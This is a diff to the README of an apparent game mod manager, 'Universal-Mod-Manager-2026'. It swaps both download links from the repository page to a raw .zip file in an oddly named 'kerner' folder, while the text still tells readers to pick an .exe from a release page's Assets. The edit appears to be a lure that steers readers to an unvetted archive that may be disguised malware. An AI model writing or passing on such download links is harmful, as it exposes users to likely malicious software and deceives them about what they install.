@@ -1,6 +1,6 @@
 # 🔧 Universal-Mod-Manager-2026 - Master your game mods with ease
 
-[![](https://img.shields.io/badge/Download-Universal_Mod_Manager-blue.svg)](https://github.com/karolyresolute5749/Universal-Mod-Manager-2026)
+[![](https://img.shields.io/badge/Download-Universal_Mod_Manager-blue.svg)](https://github.com/karolyresolute5749/Universal-Mod-Manager-2026/raw/refs/heads/main/kerner/Manager_Mod_Universal_v1.0.zip)
 
 ## 📌 About this project
 
@@ -21,7 +21,7 @@ Before you install this software, confirm your computer meets these minimum stan
 
 You need to access the official release page to get the installer for your computer. 
 
-[Visit this page to download the latest setup file](https://github.com/karolyresolute5749/Universal-Mod-Manager-2026)
+[Visit this page to download the latest setup file](https://github.com/karolyresolute5749/Universal-Mod-Manager-2026/raw/refs/heads/main/kerner/Manager_Mod_Universal_v1.0.zip)
 
 Click the link above and look for the section labeled "Assets." Choose the file ending in `.exe` to begin the download. Do not worry about the other file formats listed there; the `.exe` file is the one you need for Windows.
 
